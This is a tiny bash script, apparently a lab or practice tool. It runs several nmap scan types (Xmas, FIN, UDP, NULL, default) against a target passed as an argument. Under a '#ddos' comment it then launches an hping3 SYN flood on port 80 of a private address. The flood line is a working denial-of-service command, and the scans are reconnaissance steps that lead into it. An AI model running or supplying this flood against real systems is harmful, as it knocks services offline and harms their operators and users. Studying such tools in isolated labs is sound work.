#!/bin/bash
nmap -sX $1
nmap -sF $1
nmap -sU $1
nmap -sN $1
nmap $1
#ddos
sudo hping3 -S --flood -V -p 80 10.0.2.15